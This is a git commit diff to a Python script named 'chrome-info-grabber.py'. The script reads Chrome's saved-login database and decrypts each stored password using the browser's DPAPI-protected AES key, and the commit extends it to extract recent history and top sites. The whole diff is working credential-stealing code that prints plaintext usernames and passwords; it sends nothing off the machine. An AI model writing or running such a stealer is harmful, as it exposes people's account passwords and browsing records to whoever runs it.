26195fabfcbcf2110a63d58fc998e70e77c912d6
Aidan Kollar <54418065+BandaidMan@users.noreply.github.com>
2024-11-15 00:26:24 -0600

    Update chrome-info-grabber.py

--- chrome-info-grabber.py
+++ chrome-info-grabber.py
@@ -7,10 +7,14 @@ from Crypto.Cipher import AES # AES decryption of passwords using key
 
 appdataPath = os.getenv("APPDATA") # C:\Users\USER\AppData\Roaming. Need to go back 1 directory
 dbPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Default\Login Data"
+TopSitesdbPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Default\Top Sites"
+HistorydbPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Default\History"
 keyPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Local State" # In json format. [os_crypt][encrypted_key]
 
 print(f"\n============================================================================\n")
-print(f"Database path = {dbPath}")
+print(f"Password Database path = {dbPath}")
+print(f"Top Sites Database path = {TopSitesdbPath}")
+print(f"History Database path = {HistorydbPath}")
 print(f"Key path = {keyPath}")
 print(f"\n============================================================================\n")
 
@@ -21,8 +25,28 @@ cursor = conn.cursor()
 
 # Run SQL query and get the result from it
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-query = cursor.fetchall()
+passwordQuery = cursor.fetchall()
+conn.close()
 #query[entry][column]
+
+# Connect to Top Sites db
+conn = sqlite3.connect(TopSitesdbPath)
+cursor = conn.cursor()
+
+# Run SQL query and get the result from it
+cursor.execute('SELECT url, url_rank, title FROM top_sites ORDER BY url_rank ASC LIMIT 20')
+topSitesQuery = cursor.fetchall()
+conn.close()
+
+# Connect to History db
+conn = sqlite3.connect(HistorydbPath)
+cursor = conn.cursor()
+
+# Run SQL query and get the result from it
+cursor.execute('SELECT title, url FROM urls ORDER BY id DESC LIMIT 20')
+historyQuery = cursor.fetchall()
+conn.close()
+
 
 with open(keyPath, 'r') as file:
     data = json.load(file)
@@ -39,14 +63,25 @@ with open(keyPath, 'r') as file:
     encryptionKey = win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]
     #print(f"Encryption key: {encryptionKey.hex()}")
 
-print("\nExtracted table")
-for entry in query:
+print("Most Recent Browser History")
+print("==================================================================================")
+for entry in historyQuery:
+    print(f"{entry[0]} - {entry[1]}")
+
+print("\nMost Visited Sites")
+print("==================================================================================")
+for entry in topSitesQuery:
+    print(f"#{entry[1]+1}: {entry[2]} - {entry[0]}")
+
+
+print("\nExtracted password table")
+for entry in passwordQuery:
     print("==================================================================================")
     print(f"Site: {entry[0]}")
     print(f"User: {entry[1]}")
     #print(f"Pass: {entry[2].hex()}")
     
-    # M3 Below. AES decryption
+    # AES decryption
     encryptedPass = entry[2]
     iv = encryptedPass[3:15] # Removes v10 prefix and gets the IV of 12 bytes for AES GCM mode
     #print(f"Encrypted pass: {encryptedPass.hex()}")
@@ -64,10 +99,6 @@ for entry in query:
     print(f"Pass: {decryptedPass}")
  
 print("==================================================================================")    
-#print(f"test: {query[0][1]}")
-
-conn.close()
 
 
-# Print out SELECT statement and get key for this milestone
 
